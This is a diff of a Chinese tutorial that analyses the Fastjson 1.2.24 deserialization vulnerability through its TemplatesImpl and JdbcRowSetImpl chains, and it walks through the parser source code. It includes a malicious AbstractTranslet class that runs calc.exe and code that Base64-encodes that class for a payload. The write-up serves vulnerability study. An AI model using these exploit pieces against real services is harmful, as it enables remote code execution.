@@ -7,7 +7,7 @@ source: "MrWQ/vulnerability-paper"
 <meta name="referrer" content="no-referrer"/>
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/XPbbgLcBmHE7dmHswY_S3Q)
 
-前言本地环境搭建 Fastjson 使用    将对象序列化为 json 字符串    将 json 字符串反序列化为对象反序列化漏洞成因及利用链    漏洞成因    TemplatesImpl 反序列化链        payload        从头分析反序列化过程    JdbcRowSetImpl 反序列化链        payload        反序列化过程细节问题    setter getter 调用情况    哪些满足条件的 getter 被调用了参考链接
+前言本地环境搭建 Fastjson 使用    将对象序列化为 json 字符串    将 json 字符串反序列化为对象反序列化漏洞成因及利用链    漏洞成因    TemplatesImpl 反序列化链        payload        从头分析反序列化过程    JdbcRowSetImpl 反序列化链        payload        反序列化过程细节问题    setter getter 调用情况    哪些满足条件的 getter 被调用了参考链接
 
 前言
 --
@@ -22,13 +22,13 @@ source: "MrWQ/vulnerability-paper"
 使用 IDEA 创建一个 maven 项目，`pom.xml`中添加 fastjson 1.2.24 依赖：
 
 ```
-  <dependencies>
-      <dependency>
-          <groupId>com.alibaba</groupId>
-          <artifactId>fastjson</artifactId>
-          <version>1.2.24</version>
-      </dependency>
-  </dependencies>
+  <dependencies>
+      <dependency>
+          <groupId>com.alibaba</groupId>
+          <artifactId>fastjson</artifactId>
+          <version>1.2.24</version>
+      </dependency>
+  </dependencies>
 
 ```
 
@@ -40,55 +40,55 @@ package com.example;
 import java.util.Properties;
 
 public class User {
-   public String name;
-   private int id;
-   private Boolean bool;
-   private Properties myproperties;
+   public String name;
+   private int id;
+   private Boolean bool;
+   private Properties myproperties;
 
-   public User(){
-       System.out.println("无参构造");
-  }
+   public User(){
+       System.out.println("无参构造");
+  }
 
-   public User(String name, int id) {
-       System.out.println("有参构造");
-       this.name = name;
-       this.id = id;
-  }
+   public User(String name, int id) {
+       System.out.println("有参构造");
+       this.name = name;
+       this.id = id;
+  }
 
-   public String getName() {
-       System.out.println("getName");
-       return name;
-  }
+   public String getName() {
+       System.out.println("getName");
+       return name;
+  }
 
-   public void setName(String name) {
-       System.out.println("setName");
-       this.name = name;
-  }
+   public void setName(String name) {
+       System.out.println("setName");
+       this.name = name;
+  }
 
-   public int getId() {
-       System.out.println("getId");
-       return id;
-  }
+   public int getId() {
+       System.out.println("getId");
+       return id;
+  }
 
-   public void setId(int id) {
-       System.out.println("setId");
-       this.id = id;
-  }
+   public void setId(int id) {
+       System.out.println("setId");
+       this.id = id;
+  }
 
-   public Boolean getBool() {
-       System.out.println("getBool");
-       return bool;
-  }
+   public Boolean getBool() {
+       System.out.println("getBool");
+       return bool;
+  }
 
-   public Properties getMyproperties() {
-       System.out.println("getMyproperties");
-       return myproperties;
-  }
+   public Properties getMyproperties() {
+       System.out.println("getMyproperties");
+       return myproperties;
+  }
 
-   @Override
-   public String toString() {
-       return "[User] {" + "'}";
-  }
+   @Override
+   public String toString() {
+       return "[User] {" + "'}";
+  }
 }
 
 
@@ -111,11 +111,11 @@ package com.example;
 import com.alibaba.fastjson.JSON;
 
 public class FastjsonTest {
-   public static void main(String[] args) {
-       User user = new User("zhangsan", 22);
-       String json = JSON.toJSONString(user);
-       System.out.println(json);
-  }
+   public static void main(String[] args) {
+       User user = new User("zhangsan", 22);
+       String json = JSON.toJSONString(user);
+       System.out.println(json);
+  }
 }
 
 //输出结果
@@ -181,22 +181,22 @@ package com.example;
 import com.alibaba.fastjson.JSON;
 
 public class FastjsonTest {
-   public static void main(String[] args) {
-       String json1 = "{\"@type\":\"com.example.User\",\"id\":22,\"name\":\"zhangsan\"}";
-       String json2 = "{\"id\":22,\"name\":\"zhangsan\"}";
-       System.out.println("===");
-       System.out.println(JSON.parse(json1));
-       System.out.println("===");
-       System.out.println(JSON.parseObject(json1));
-       System.out.println("===");
-       System.out.println(JSON.parseObject(json1, User.class));
-       System.out.println("===");
-       System.out.println(JSON.parse(json2));
-       System.out.println("===");
-       System.out.println(JSON.parseObject(json2));
-       System.out.println("===");
-       System.out.println(JSON.parseObject(json2, User.class));
-  }
+   public static void main(String[] args) {
+       String json1 = "{\"@type\":\"com.example.User\",\"id\":22,\"name\":\"zhangsan\"}";
+       String json2 = "{\"id\":22,\"name\":\"zhangsan\"}";
+       System.out.println("===");
+       System.out.println(JSON.parse(json1));
+       System.out.println("===");
+       System.out.println(JSON.parseObject(json1));
+       System.out.println("===");
+       System.out.println(JSON.parseObject(json1, User.class));
+       System.out.println("===");
+       System.out.println(JSON.parse(json2));
+       System.out.println("===");
+       System.out.println(JSON.parseObject(json2));
+       System.out.println("===");
+       System.out.println(JSON.parseObject(json2, User.class));
+  }
 }
 
 // 输出结果
@@ -279,21 +279,21 @@ import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
 import java.io.IOException;
 
 public class EvilClass extends AbstractTranslet {
-   public EvilClass() throws IOException {
-       Runtime.getRuntime().exec("calc.exe");
-  }
+   public EvilClass() throws IOException {
+       Runtime.getRuntime().exec("calc.exe");
+  }
 
-   @Override
-   public void transform(DOM document, SerializationHandler[] handlers) throws TransletException{
+   @Override
+   public void transform(DOM document, SerializationHandler[] handlers) throws TransletException{
 
-  }
-   public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException{
+  }
+   public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException{
 
-  }
+  }
 
-   public static void main(String[] args) throws Exception{
-       EvilClass evilClass = new EvilClass();
-  }
+   public static void main(String[] args) throws Exception{
+       EvilClass evilClass = new EvilClass();
+  }
 
 }
 
@@ -310,27 +310,27 @@ import java.util.Base64;
 import java.util.Base64.Encoder;
 
 public class HelloWorld {
-   public static void main(String args[]) {
-       byte[] buffer = null;
-       String filepath = ".\\src\\main\\java\\test\\EvilClass.class";
-       try {
-           FileInputStream fis = new FileInputStream(filepath);
-           ByteArrayOutputStream bos = new ByteArrayOutputStream();
-           byte[] b = new byte[1024];
-           int n;
-           while((n = fis.read(b))!=-1) {
-               bos.write(b,0,n);
-          }
-           fis.close();
-           bos.close();
-           buffer = bos.toByteArray();
-      }catch(Exception e) {
-           e.printStackTrace();
-      }
-       Encoder encoder = Base64.getEncoder();
-       String value = encoder.encodeToString(buffer);
-       System.out.println(value);
-  }
+   public static void main(String args[]) {
+       byte[] buffer = null;
+       String filepath = ".\\src\\main\\java\\test\\EvilClass.class";
+       try {
+           FileInputStream fis = new FileInputStream(filepath);
+           ByteArrayOutputStream bos = new ByteArrayOutputStream();
+           byte[] b = new byte[1024];
+           int n;
+           while((n = fis.read(b))!=-1) {
+               bos.write(b,0,n);
+          }
+           fis.close();
+           bos.close();
+           buffer = bos.toByteArray();
+      }catch(Exception e) {
+           e.printStackTrace();
+      }
+       Encoder encoder = Base64.getEncoder();
+       String value = encoder.encodeToString(buffer);
+       System.out.println(value);
+  }
 }
 
 ```
@@ -371,15 +371,15 @@ Fastjson 默认（私有变量没有 setter 方法时）只会反序列化 publi
 
 ```
 public static Object parse(String text, int features) {
-   if (text == null) {
-       return null;
-  } else {
-       DefaultJSONParser parser = new DefaultJSONParser(text, ParserConfig.getGlobalInstance(), features);
-       Object value = parser.parse();
-       parser.handleResovleTask(value);
-       parser.close();
-       return value;
-  }
+   if (text == null) {
+       return null;
+  } else {
+       DefaultJSONParser parser = new DefaultJSONParser(text, ParserConfig.getGlobalInstance(), features);
+       Object value = parser.parse();
+       parser.handleResovleTask(value);
+       parser.close();
+       return value;
+  }
 }
 
 ```
@@ -390,26 +390,26 @@ public static Object parse(String text, int features) {
 
 ```
 public DefaultJSONParser(Object input, JSONLexer lexer, ParserConfig config) {
-   this.dateFormatPattern = JSON.DEFFAULT_DATE_FORMAT;
-   this.contextArrayIndex = 0;
-   this.resolveStatus = 0;
-   this.extraTypeProviders = null;
-   this.extraProcessors = null;
-   this.fieldTypeResolver = null;
-   this.lexer = lexer;
-   this.input = input;
-   this.config = config;
-   this.symbolTable = config.symbolTable;
-   int ch = lexer.getCurrent();
-   if (ch == '{') {
-       lexer.next();
-      ((JSONLexerBase)lexer).token = 12;
-  } else if (ch == '[') {
-       lexer.next();
-      ((JSONLexerBase)lexer).token = 14;
-  } else {
-       lexer.nextToken();
-  }
+   this.dateFormatPattern = JSON.DEFFAULT_DATE_FORMAT;
+   this.contextArrayIndex = 0;
+   this.resolveStatus = 0;
+   this.extraTypeProviders = null;
+   this.extraProcessors = null;
+   this.fieldTypeResolver = null;
+   this.lexer = lexer;
+   this.input = input;
+   this.config = config;
+   this.symbolTable = config.symbolTable;
+   int ch = lexer.getCurrent();
+   if (ch == '{') {
+       lexer.next();
+      ((JSONLexerBase)lexer).token = 12;
+  } else if (ch == '[') {
+       lexer.next();
+      ((JSONLexerBase)lexer).token = 14;
+  } else {
+       lexer.nextToken();
+  }
 
 }
 
@@ -423,8 +423,8 @@ public DefaultJSONParser(Object input, JSONLexer lexer, ParserConfig config) {
 
 ```
 case 12:
-   JSONObject object = new JSONObject(lexer.isEnabled(Feature.OrderedField));
-   return this.parseObject((Map)object, fieldName);
+   JSONObject object = new JSONObject(lexer.isEnabled(Feature.OrderedField));
+   return this.parseObject((Map)object, fieldName);
 
 ```
 
@@ -434,12 +434,12 @@ case 12:
 
 ```
 if (ch == '"') {
-   key = lexer.scanSymbol(this.symbolTable, '"');
-   lexer.skipWhitespace();
-   ch = lexer.getCurrent();
-   if (ch != ':') {
-       throw new JSONException("expect ':' at " + lexer.pos() + ", name " + key);
-  }
+   key = lexer.scanSymbol(this.symbolTable, '"');
+   lexer.skipWhitespace();
+   ch = lexer.getCurrent();
+   if (ch != ':') {
+       throw new JSONException("expect ':' at " + lexer.pos() + ", name " + key);
+  }
 }
 
 ```
@@ -448,8 +448,8 @@ if (ch == '"') {
 
 ```
 if (key == JSON.DEFAULT_TYPE_KEY && !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) {
-   ref = lexer.scanSymbol(this.symbolTable, '"');
-   Class<?> clazz = TypeUtils.loadClass(ref, this.config.getDefaultClassLoader());
+   ref = lexer.scanSymbol(this.symbolTable, '"');
+   Class<?> clazz = TypeUtils.loadClass(ref, this.config.getDefaultClassLoader());
 
 ```
 
@@ -475,10 +475,10 @@ String className = clazz.getName();
 className = className.replace('$', '.');
 
 for(int i = 0; i < this.denyList.length; ++i) {
-   String deny = this.denyList[i];
-   if (className.startsWith(deny)) {
-       throw new JSONException("parser deny : " + className);
-  }
+   String deny = this.denyList[i];
+   if (className.startsWith(deny)) {
+       throw new JSONException("parser deny : " + className);
+  }
 }
 
 ```
@@ -493,12 +493,12 @@ for(int i = 0; i < this.denyList.length; ++i) {
 
 ```
 if (object == null && fieldValues == null) {
-   object = this.createInstance(parser, type);
-   if (object == null) {
-       fieldValues = new HashMap(this.fieldDeserializers.length);
-  }
+   object = this.createInstance(parser, type);
+   if (object == null) {
+       fieldValues = new HashMap(this.fieldDeserializers.length);
+  }
 
-   childContext = parser.setContext(context, object, fieldName);
+   childContext = parser.setContext(context, object, fieldName);
 }
 
 ```
@@ -520,12 +520,12 @@ boolean match = this.parseField(parser, key, object, type, fieldValues);
 
 ```
 public synchronized Properties getOutputProperties() {
-   try {
-       return newTransformer().getOutputProperties();
-  }
-   catch (TransformerConfigurationException e) {
-       return null;
-  }
+   try {
+       return newTransformer().getOutputProperties();
+  }
+   catch (TransformerConfigurationException e) {
+       return null;
+  }
 }
 
 ```
@@ -542,16 +542,16 @@ public synchronized Properties getOutputProperties() {
 
 ```
 for (int i = 0; i < classCount; i++) {
-   _class[i] = loader.defineClass(_bytecodes[i]);
-   final Class superClass = _class[i].getSuperclass();
+   _class[i] = loader.defineClass(_bytecodes[i]);
+   final Class superClass = _class[i].getSuperclass();
 
-   // Check if this is the main class
-   if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
-       _transletIndex = i;
-  }
-   else {
-       _auxClasses.put(_class[i].getName(), _class[i]);
-  }
+   // Check if this is the main class
+   if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
+       _transletIndex = i;
+  }
+   else {
+       _auxClasses.put(_class[i].getName(), _class[i]);
+  }
 }
 
 ```
@@ -564,7 +564,7 @@ for (int i = 0; i < classCount; i++) {
 
 ```
 AbstractTranslet translet = (AbstractTranslet)
-                   _class[_transletIndex].getConstructor().newInstance();
+                   _class[_transletIndex].getConstructor().newInstance();
 
 ```
 
@@ -608,12 +608,12 @@ jdk8 新版本中有进一步限制黑名单，包括`jdk8u231`、`jdk8u241`
 
 ```
 public void setAutoCommit(boolean var1) throws SQLException {
-   if (this.conn != null) {
-       this.conn.setAutoCommit(var1);
-  } else {
-       this.conn = this.connect();
-       this.conn.setAutoCommit(var1);
-  }
+   if (this.conn != null) {
+       this.conn.setAutoCommit(var1);
+  } else {
+       this.conn = this.connect();
+       this.conn.setAutoCommit(var1);
+  }
 
 }
 
@@ -623,19 +623,19 @@ public void setAutoCommit(boolean var1) throws SQLException {
 
 ```
 private Connection connect() throws SQLException {
-   if (this.conn != null) {
-       return this.conn;
-  } else if (this.getDataSourceName() != null) {
-       try {
-           InitialContext var1 = new InitialContext();
-           DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
-           return this.getUsername() != null && !this.getUsername().equals("") ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection();
-      } catch (NamingException var3) {
-           throw new SQLException(this.resBundle.handleGetObject("jdbcrowsetimpl.connect").toString());
-      }
-  } else {
-       return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null;
-  }
+   if (this.conn != null) {
+       return this.conn;
+  } else if (this.getDataSourceName() != null) {
+       try {
+           InitialContext var1 = new InitialContext();
+           DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
+           return this.getUsername() != null && !this.getUsername().equals("") ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection();
+      } catch (NamingException var3) {
+           throw new SQLException(this.resBundle.handleGetObject("jdbcrowsetimpl.connect").toString());
+      }
+  } else {
+       return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null;
+  }
 }
 
 ```
